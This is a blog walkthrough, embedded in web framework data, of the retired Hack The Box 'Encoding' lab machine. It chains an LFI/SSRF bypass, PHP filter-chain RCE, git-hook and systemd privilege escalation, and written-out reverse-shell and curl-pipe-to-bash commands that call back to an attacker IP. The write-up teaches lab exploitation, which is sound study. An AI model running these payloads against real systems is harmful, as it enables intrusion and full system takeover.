@@ -1,0 +1,320 @@
+1:"$Sreact.fragment"
+2:I[2509,["509","static/chunks/509-dbc1ccf593ce6127.js","851","static/chunks/app/writing/%5Bslug%5D/page-bea6638222930ed2.js"],""]
+3:I[6621,["509","static/chunks/509-dbc1ccf593ce6127.js","851","static/chunks/app/writing/%5Bslug%5D/page-bea6638222930ed2.js"],"MobileNavigation"]
+e:I[6025,[],"OutletBoundary"]
+f:"$Sreact.suspense"
+:HL["/writing/covers/hackthebox-encoding-walkthrough.webp","image"]
+0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","a","/research",{"href":"/research","children":"Research"}],["$","a","/services",{"href":"/services","children":"Services"}],["$","a","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","a","/projects",{"href":"/projects","children":"Projects"}],["$","a","/about",{"href":"/about","children":"About"}]]}],["$","$L2",null,{"className":"utility-link","href":"/contact#assessment-enquiries","children":["Start an enquiry ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L3",null,{"items":[{"label":"Research","href":"/research"},{"label":"Services","href":"/services"},{"label":"Writing","href":"/writing"},{"label":"Projects","href":"/projects"},{"label":"About","href":"/about"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing archive"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Encoding Walkthrough"}],["$","p",null,{"className":"article-dek","children":"An archived walkthrough of the retired Hack The Box Encoding machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T15:23:59.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[9," minutes"]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-encoding-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Encoding machine avatar","decoding":"async"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Encoding machine artwork, used for identification. Hack The Box is not affiliated with this archive."}],["$","a",null,{"href":"https://www.hackthebox.com/machines/encoding","target":"_blank","rel":"nofollow noopener noreferrer","children":["Hack The Box machine artwork"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article provenance and review context","children":[["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Archive provenance"}],[["$","p",null,{"children":["Archived from public GitHub preparation notes"," on ","11 Jun 2026",". Added to CyberKareem on ","12 Jul 2026","."]}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/c1faf5405ea447d21d7b1db437f1ab21f91c5ed0/HTB-Encoding.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}],["$","small",null,{"children":["CyberKareem/OSWE-Prep"," · c1faf5405ea4",""]}]]]}],["$","div",null,{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Encoding"," · Linux"," · Medium"," · Retired status verified 12 Jul 2026","."]}],["$","a",null,{"href":"https://www.hackthebox.com/machines/encoding","target":"_blank","rel":"nofollow noopener noreferrer","children":["Open Hack The Box profile ","$L4"]}]]}],["$L5","$L6"]]}],"$L7"]}]]}],"$L8"]}],"$L9","$La"],null,"$Lb"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"65jXSdzueZKnFbMeYrtpi"}
+4:["$","span",null,{"aria-hidden":"true","children":"↗"}]
+5:["$","div","lab-archive-0",{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Archived, authorized retired-lab walkthrough"}],["$","p",null,{"children":"This personal lab note documents the officially retired Hack The Box Encoding machine. Retired status was verified on 12 July 2026. Use the techniques only on systems you own or have explicit permission to test."}],null]}]
+6:["$","div","source-context-1",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"GitHub archive context"}],["$","p",null,{"children":"Imported mechanically from Abdullah Kareem's public preparation notes. Commands and claims reflect the archived lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
+c:T4958,
+<p><strong>Target IP:</strong> <code>10.129.11.197</code><br /><strong>Attacker IP:</strong> <code>10.10.16.84</code><br /><strong>OS:</strong> Linux (Ubuntu 22.04)<br /><strong>Difficulty:</strong> Medium</p>
+<hr />
+
+
+
+<h2 id="1-reconnaissance">1. Reconnaissance</h2>
+<h3 id="hacker-mindset">Hacker Mindset</h3>
+<p>Before touching anything, we need to understand what we're dealing with. Reconnaissance is about mapping the attack surface. Every open port is a potential entry point. We scan all ports first (fast), then deep-dive into the open ones with service detection.</p>
+<h3 id="commands">Commands</h3>
+<pre><code class="language-bash" data-language="bash"># Fast port scan - find all open ports
+sudo nmap -p- --min-rate 10000 10.129.11.197
+
+# Detailed scan on discovered ports
+sudo nmap -p 22,80 -sCV 10.129.11.197
+</code></pre>
+<h3 id="results">Results</h3>
+<pre><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+</code></pre>
+<p><strong>Analysis:</strong> Only two ports open. SSH is usually not directly exploitable without credentials. HTTP is our primary target. The Apache and OpenSSH versions suggest Ubuntu 22.04 "Jammy."</p>
+<h3 id="adding-hosts-to-etc-hosts">Adding Hosts to /etc/hosts</h3>
+<pre><code class="language-bash" data-language="bash">echo "10.129.11.197 haxtables.htb api.haxtables.htb image.haxtables.htb" | sudo tee -a /etc/hosts
+</code></pre>
+<p><strong>Why:</strong> Modern web applications often use virtual hosts (vhosts) to serve different content based on the <code>Host</code> header. If we only visit the IP, we might miss subdomains that serve critical functionality. The main site's API documentation mentions <code>api.haxtables.htb</code>, so we add it proactively.</p>
+<hr />
+<h2 id="2-understanding-the-web-application">2. Understanding the Web Application</h2>
+<h3 id="hacker-mindset-2">Hacker Mindset</h3>
+<p>When you land on a web app, don't just click around randomly. Understand the tech stack, identify entry points, and look for places where user input reaches the server. Every form, every API endpoint, and every URL parameter is a potential attack vector.</p>
+<h3 id="what-we-found">What We Found</h3>
+<ul>
+<li><strong>Main Site (<code>haxtables.htb</code>):</strong> A "string and number converter" toy app. Has pages for String, Integer, Image, and API documentation.</li>
+<li><strong>API Site (<code>api.haxtables.htb</code>):</strong> Documented endpoints for <code>POST /v3/tools/string/index.php</code> and <code>POST /v3/tools/integer/index.php</code>.</li>
+<li><strong>Image Site (<code>image.haxtables.htb</code>):</strong> Returns 403 Forbidden. This is suspicious — it might be filtering by IP.</li>
+</ul>
+<p><strong>Key Observation:</strong> The API documentation shows Python examples. The last example is interesting:</p>
+<pre><code class="language-python" data-language="python">json_data = {
+    'action': 'str2hex',
+    'file_url' : 'http://example.com/data.txt'
+}
+response = requests.post('http://api.haxtables.htb/v3/tools/string/index.php', json=json_data)
+</code></pre>
+<p><strong>The <code>file_url</code> parameter stands out.</strong> Instead of sending data directly, we can ask the server to fetch data from a URL. This screams "Server-Side Request Forgery (SSRF)" or "Local File Inclusion (LFI)."</p>
+<hr />
+<h2 id="3-discovering-the-lfi">3. Discovering the LFI</h2>
+<h3 id="hacker-mindset-3">Hacker Mindset</h3>
+<p>When you see a parameter that takes a URL, immediately test:</p>
+<ol>
+<li><strong>SSRF:</strong> Can it reach internal services? (<code>http://127.0.0.1</code>, <code>http://localhost</code>)</li>
+<li><strong>LFI:</strong> Can it read local files? (<code>file:///etc/passwd</code>)</li>
+<li><strong>RFI:</strong> Can it load remote files? (<code>http://attacker.com/evil.php</code>)</li>
+</ol>
+<p>The <code>file://</code> scheme is often forgotten by developers. They might block <code>http://127.0.0.1</code> but completely miss <code>file:///etc/passwd</code>.</p>
+<h3 id="testing-the-lfi">Testing the LFI</h3>
+<pre><code class="language-bash" data-language="bash">curl -s -X POST http://api.haxtables.htb/v3/tools/string/index.php \
+  -H "Content-Type: application/json" \
+  -d '{"action":"str2hex","file_url":"file:///etc/passwd"}' | \
+  python3 -c "import sys,json; print(bytes.fromhex(json.load(sys.stdin)['data']).decode())"
+</code></pre>
+<p><strong>Result:</strong> The server returns the hex-encoded contents of <code>/etc/passwd</code>.</p>
+<p><strong>Why this works:</strong> The server uses <code>curl</code> or <code>file_get_contents()</code> to fetch the URL. The <code>file://</code> scheme tells it to read from the local filesystem instead of making an HTTP request. The developer only blocked HTTP SSRF, not file-based LFI.</p>
+<p><strong>What we learned:</strong></p>
+<ul>
+<li>We can read any file the web server user (<code>www-data</code>) can read.</li>
+<li>The user <code>svc</code> exists on the system (<code>uid=1000</code>).</li>
+<li>The hostname is <code>encoding</code>.</li>
+</ul>
+<hr />
+<h2 id="4-the-ssrf-bypass">4. The SSRF Bypass</h2>
+<h3 id="hacker-mindset-4">Hacker Mindset</h3>
+<p>We know <code>image.haxtables.htb</code> returns 403 from our IP. The Apache config (which we can read via LFI) reveals:</p>
+<pre><code class="language-apache" data-language="apache">&lt;Directory /var/www/image&gt; 
+    Deny from all
+    Allow from 127.0.0.1
+&lt;/Directory&gt;
+</code></pre>
+<p>It's localhost-only. We need to reach it from the server itself. The <code>file_url</code> parameter has a check:</p>
+<pre><code class="language-php" data-language="php">$domain = parse_url($url, PHP_URL_HOST);
+if (gethostbyname($domain) === "127.0.0.1") {
+    echo jsonify(["message" =&gt; "Unacceptable URL"]);
+}
+</code></pre>
+<p><strong>The Vulnerability:</strong> PHP's <code>parse_url()</code> is weird. If you pass <code>http://image.haxtables.htb</code>, it returns <code>image.haxtables.htb</code>. But if you pass <code>image.haxtables.htb</code> <strong>without the scheme</strong>, <code>parse_url()</code> returns <code>NULL</code> for the host. <code>gethostbyname(NULL)</code> does NOT return <code>127.0.0.1</code>, so the check passes. Meanwhile, <code>curl</code> doesn't care if there's no scheme — it defaults to HTTP.</p>
+<h3 id="testing-the-bypass">Testing the Bypass</h3>
+<pre><code class="language-bash" data-language="bash">curl -s -X POST http://api.haxtables.htb/v3/tools/string/index.php \
+  -H "Content-Type: application/json" \
+  -d '{"action":"str2hex","file_url":"image.haxtables.htb/actions/action_handler.php?page=/etc/passwd"}' | \
+  python3 -c "import sys,json; print(bytes.fromhex(json.load(sys.stdin)['data']).decode())"
+</code></pre>
+<p><strong>Result:</strong> We read <code>/etc/passwd</code> through <code>image.haxtables.htb</code>. The bypass works.</p>
+<p><strong>What we discovered:</strong> <code>image.haxtables.htb/actions/action_handler.php</code> contains:</p>
+<pre><code class="language-php" data-language="php">&lt;?php
+include_once 'utils.php';
+if (isset($_GET['page'])) {
+    $page = $_GET['page'];
+    include($page);  // &lt;-- LFI!
+}
+?&gt;
+</code></pre>
+<p>This is a direct file inclusion. If we can make PHP execute code through this <code>include()</code>, we get RCE.</p>
+<hr />
+<h2 id="5-from-lfi-to-rce">5. From LFI to RCE</h2>
+<h3 id="hacker-mindset-5">Hacker Mindset</h3>
+<p>Classic LFI (Local File Inclusion) used to require log poisoning or file uploads to get RCE. But modern PHP has a powerful technique: <strong>PHP Filter Chain Injection</strong>.</p>
+<p>The idea: PHP's <code>php://filter/</code> wrapper allows chaining conversion filters. By carefully stacking encoding/decoding filters on a temporary empty file, we can craft arbitrary PHP code byte-by-byte. The server includes our filter chain, which generates and executes our payload.</p>
+<h3 id="tool-php-filter-chain-generator">Tool: php_filter_chain_generator</h3>
+<pre><code class="language-bash" data-language="bash">git clone https://github.com/synacktiv/php_filter_chain_generator.git
+</code></pre>
+<p>This tool generates the exact filter chain needed to inject arbitrary PHP code.</p>
+<h3 id="proving-code-execution">Proving Code Execution</h3>
+<p>First, test with a simple command to confirm execution:</p>
+<pre><code class="language-bash" data-language="bash">python3 -c "
+import subprocess, requests
+
+chain = subprocess.check_output([
+    'python3', 'php_filter_chain_generator.py',
+    '--chain', '&lt;?php system(\"id\"); ?&gt;'
+], text=True).splitlines()[-1].strip()
+
+resp = requests.post(
+    'http://api.haxtables.htb/v3/tools/string/index.php',
+    json={'action': 'str2hex', 'file_url': f'image.haxtables.htb/actions/action_handler.php?page={chain}'}
+)
+
+print(bytes.fromhex(resp.json()['data']).decode())
+"
+</code></pre>
+<p><strong>Result:</strong> <code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></p>
+<p><strong>We have RCE as www-data.</strong></p>
+<hr />
+<h2 id="6-shell-as-www-data">6. Shell as www-data</h2>
+<h3 id="hacker-mindset-6">Hacker Mindset</h3>
+<p>Getting RCE is great, but an interactive shell is better. We need a stable reverse shell. The challenge: the filter chain is very long (thousands of characters). If the request hangs or times out, the server might kill the PHP process before the shell spawns.</p>
+<p><strong>Better approach:</strong> Instead of embedding a long reverse shell command in the filter chain, keep the command short. The shortest reliable approach is to have the server download a shell script from us and pipe it to bash.</p>
+<h3 id="setting-up-the-shell">Setting Up the Shell</h3>
+<p><strong>Terminal 1 (Kali) — create script and start HTTP server:</strong></p>
+<pre><code class="language-bash" data-language="bash">echo 'bash -i &gt;&amp; /dev/tcp/10.10.16.84/4444 0&gt;&amp;1' &gt; /tmp/shell.sh
+python3 -m http.server 8000
+</code></pre>
+<p><strong>Terminal 2 (Kali) — start listener:</strong></p>
+<pre><code class="language-bash" data-language="bash">nc -lnvp 4444
+</code></pre>
+<p><strong>Terminal 3 (Kali) — send the payload:</strong></p>
+<pre><code class="language-bash" data-language="bash">python3 -c "
+import subprocess, requests
+
+chain = subprocess.check_output([
+    'python3', 'php_filter_chain_generator.py',
+    '--chain', '&lt;?php system(\"curl -s http://10.10.16.84:8000/shell.sh | bash\"); ?&gt;'
+], text=True).splitlines()[-1].strip()
+
+requests.post(
+    'http://api.haxtables.htb/v3/tools/string/index.php',
+    json={'action': 'str2hex', 'file_url': f'image.haxtables.htb/actions/action_handler.php?page={chain}'}
+)
+print('Payload sent.')
+"
+</code></pre>
+<p><strong>Why this works:</strong></p>
+<ul>
+<li>The filter chain is short because the PHP payload is short.</li>
+<li><code>system()</code> returns immediately because <code>curl | bash</code> forks the shell in the background.</li>
+<li>The backgrounded bash shell connects back to our listener independently.</li>
+</ul>
+<p><strong>Result:</strong></p>
+<pre><code>connect to [10.10.16.84] from (UNKNOWN) [10.129.11.197] 45534
+bash: cannot set terminal process group: Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@encoding:~/image/actions$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+<hr />
+<h2 id="7-privilege-escalation-to-svc">7. Privilege Escalation to svc</h2>
+<h3 id="hacker-mindset-7">Hacker Mindset</h3>
+<p>Always run <code>sudo -l</code> on any shell you get. It tells you exactly what the current user can do with elevated privileges.</p>
+<p>From the www-data shell:</p>
+<pre><code class="language-bash" data-language="bash">sudo -l
+</code></pre>
+<p><strong>Result:</strong></p>
+<pre><code>User www-data may run the following commands on encoding:
+    (svc) NOPASSWD: /var/www/image/scripts/git-commit.sh
+</code></pre>
+<p>We can run a git commit script as <code>svc</code> without a password. Time to understand what this script does.</p>
+<h3 id="analyzing-git-commit-sh">Analyzing git-commit.sh</h3>
+<pre><code class="language-bash" data-language="bash">#!/bin/bash
+u=$(/usr/bin/git --git-dir=/var/www/image/.git --work-tree=/var/www/image ls-files -o --exclude-standard)
+
+if [[ $u ]]; then
+    /usr/bin/git --git-dir=/var/www/image/.git --work-tree=/var/www/image add -A
+else
+    /usr/bin/git --git-dir=/var/www/image/.git --work-tree=/var/www/image commit -m "Commited from API!" --author="james &lt;james@haxtables.htb&gt;" --no-verify
+fi
+</code></pre>
+<p><strong>Logic:</strong></p>
+<ul>
+<li>If there are untracked files in <code>/var/www/image</code>, add them.</li>
+<li>If there are NO untracked files, commit the staged changes.</li>
+</ul>
+<p><strong>The Hook:</strong> Git has a hook called <code>post-commit</code> that runs <strong>after</strong> a successful commit. If we write a malicious <code>post-commit</code> script and trigger a commit as <code>svc</code>, our code executes as <code>svc</code>.</p>
+<h3 id="checking-permissions">Checking Permissions</h3>
+<pre><code class="language-bash" data-language="bash">getfacl /var/www/image/.git/
+</code></pre>
+<p><strong>Result:</strong></p>
+<pre><code>user:www-data:rwx
+</code></pre>
+<p><code>www-data</code> can write to the <code>.git</code> directory, including <code>.git/hooks/</code>.</p>
+<h3 id="the-exploit">The Exploit</h3>
+<p><strong>Step 1 — write the post-commit hook:</strong></p>
+<pre><code class="language-bash" data-language="bash">cd /var/www/image
+echo -e '#!/bin/bash\nbash -i &gt;&amp; /dev/tcp/10.10.16.84/5555 0&gt;&amp;1' &gt; .git/hooks/post-commit
+chmod +x .git/hooks/post-commit
+</code></pre>
+<p><strong>Step 2 — stage a file to force a commit:</strong></p>
+<pre><code class="language-bash" data-language="bash">/usr/bin/git --git-dir=/var/www/image/.git --work-tree=/etc add /etc/hosts
+</code></pre>
+<p>We use <code>--work-tree=/etc</code> to stage a file outside the repo. This doesn't create untracked files in <code>/var/www/image</code>, so <code>git-commit.sh</code> will take the <code>else</code> branch and commit.</p>
+<p><strong>Step 3 — trigger the commit as svc:</strong></p>
+<pre><code class="language-bash" data-language="bash">sudo -u svc /var/www/image/scripts/git-commit.sh
+</code></pre>
+<p><strong>Step 4 — catch the shell on Kali (port 5555):</strong></p>
+<pre><code class="language-bash" data-language="bash">nc -lnvp 5555
+</code></pre>
+<p><strong>Result:</strong></p>
+<pre><code>connect to [10.10.16.84] from (UNKNOWN) [10.129.11.197] 38652
+svc@encoding:/var/www/image$ id
+uid=1000(svc) gid=1000(svc) groups=1000(svc)
+</code></pre>
+<p><strong>Why this works:</strong> Git hooks run with the privileges of the user executing git. Since <code>sudo -u svc</code> runs git as <code>svc</code>, the hook also runs as <code>svc</code>.</p>
+<hr />
+<h2 id="8-privilege-escalation-to-root">8. Privilege Escalation to root</h2>
+<h3 id="hacker-mindset-8">Hacker Mindset</h3>
+<p>Again, <code>sudo -l</code> is the first thing to run.</p>
+<pre><code class="language-bash" data-language="bash">sudo -l
+</code></pre>
+<p><strong>Result:</strong></p>
+<pre><code>User svc may run the following commands on encoding:
+    (root) NOPASSWD: /usr/bin/systemctl restart *
+</code></pre>
+<p><code>svc</code> can restart <strong>any</strong> systemd service as root. Systemd services run as whatever user is specified in their unit file. If we create a service that runs as <code>root</code> and executes a command of our choosing, we get root.</p>
+<h3 id="checking-writable-paths">Checking Writable Paths</h3>
+<pre><code class="language-bash" data-language="bash">find /etc/systemd -writable
+</code></pre>
+<p><strong>Result:</strong> <code>/etc/systemd/system</code> is writable by <code>svc</code>.</p>
+<h3 id="the-exploit-2">The Exploit</h3>
+<p><strong>Step 1 — create the malicious service:</strong></p>
+<pre><code class="language-bash" data-language="bash">echo '[Unit]
+Description=privesc
+
+[Service]
+Type=oneshot
+ExecStart=/bin/bash -c "bash -i &gt;&amp; /dev/tcp/10.10.16.84/7777 0&gt;&amp;1"
+
+[Install]
+WantedBy=multi-user.target' &gt; /etc/systemd/system/privesc.service
+</code></pre>
+<p><strong>Step 2 — start listener on Kali:</strong></p>
+<pre><code class="language-bash" data-language="bash">nc -lnvp 7777
+</code></pre>
+<p><strong>Step 3 — restart the service as root:</strong></p>
+<pre><code class="language-bash" data-language="bash">sudo systemctl restart privesc
+</code></pre>
+<p><strong>Why this works:</strong></p>
+<ul>
+<li><code>svc</code> can write to <code>/etc/systemd/system/</code>.</li>
+<li><code>svc</code> can run <code>systemctl restart *</code> as root without a password.</li>
+<li>On this systemd version, <code>restart</code> on a newly created unit file works without <code>daemon-reload</code>.</li>
+<li>The service runs <code>ExecStart</code> as <code>root</code> (default user for system services is root).</li>
+</ul>
+<p><strong>Result:</strong></p>
+<pre><code>connect to [10.10.16.84] from (UNKNOWN) [10.129.11.197] 35676
+root@encoding:/# id
+uid=0(root) gid=0(root) groups=0(root)
+root@encoding:/# cat /root/root.txt
+2ee93a[redacted]3ea36ea1
+</code></pre>
+<hr />
+<h2 id="9-key-lessons">9. Key Lessons</h2>
+<h3 id="1-parse-url-quirks">1. Parse URL Quirks</h3>
+<p>PHP's <code>parse_url()</code> without a scheme returns <code>NULL</code> for the host. Developers who rely on it for SSRF protection create trivial bypasses.</p>
+<h3 id="2-file-schemes-are-forgotten">2. File Schemes Are Forgotten</h3>
+<p>If an application fetches URLs, always test <code>file:///etc/passwd</code>. Developers often secure HTTP/HTTPS but completely miss <code>file://</code>.</p>
+<h3 id="3-php-filter-chains">3. PHP Filter Chains</h3>
+<p>Modern PHP LFI can become RCE through <code>php://filter/</code> chain injection. Learn this technique — it works on many CTFs and real applications.</p>
+<h3 id="4-abusing-git-hooks">4. Abusing Git Hooks</h3>
+<p>If a user can run <code>git</code> as another user (via sudo, cron, etc.), and can write to <code>.git/hooks/</code>, that's essentially code execution as the target user.</p>
+<h3 id="5-systemctl-restart">5. systemctl restart *</h3>
+<p><code>systemctl restart *</code> as root is incredibly powerful. Any user who can create unit files and restart services can get root.</p>
+<h3 id="6-short-payloads-beat-long-ones">6. Short Payloads Beat Long Ones</h3>
+<p>When exploiting through injection or encoding, shorter payloads are more reliable. Offload complexity to a downloaded script rather than embedding it directly.</p>
+<hr />
+<h2 id="flags">Flags</h2>
+<table>
+<thead>
+<tr>
+<th>User</th>
+<th><code>fed396[redacted]df885b9d</code></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Root</td>
+<td><code>2ee93a1[redacted]ea36ea1</code></td>
+</tr>
+</tbody></table>
+7:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$c"}}]
+8:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing archive navigation","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-eighteen-walkthrough","children":[["$","span",null,{"children":"Newer article"}],["$","strong",null,{"children":"Hack The Box: Eighteen Walkthrough"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",114," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-facts-walkthrough","children":[["$","span",null,{"children":"Older article"}],["$","strong",null,{"children":"Hack The Box: Facts Walkthrough"}]]}]}]]}]
+9:["$","footer",null,{"className":"site-footer","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Security Researcher and Penetration Tester"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Public profiles","children":[["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Hack The Box",{"href":"https://app.hackthebox.com/public/users/349278","target":"_blank","rel":"noreferrer","children":["Hack The Box"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Credential wallet",{"href":"https://www.credential.net/profile/cyberkareem/wallet","target":"_blank","rel":"noreferrer","children":["Credential wallet"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Credly",{"href":"https://www.credly.com/users/cyberkareem/badges","target":"_blank","rel":"noreferrer","children":["Credly"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Evidence-led research · authorized assessment"}],["$","$L2",null,{"href":"/services","children":"Explore security services →"}]]}]]}]
+d:T528,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-encoding-walkthrough/#article","headline":"Hack The Box: Encoding Walkthrough","description":"An archived walkthrough of the retired Hack The Box Encoding machine, preserved from Abdullah Kareem's OSWE Prep preparation notes.","url":"https://cyberkareem.com/writing/hackthebox-encoding-walkthrough/","datePublished":"2026-06-11T15:23:59.000Z","dateModified":"2026-07-12T00:00:00.000Z","wordCount":1700,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/c1faf5405ea447d21d7b1db437f1ab21f91c5ed0/HTB-Encoding.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/writing/covers/hackthebox-encoding-walkthrough.webp","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-encoding-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Encoding Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-encoding-walkthrough/"}]}]}a:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$d"}}]
+b:["$","$Le",null,{"children":["$","$f",null,{"name":"Next.MetadataOutlet","children":"$@10"}]}]
+10:null
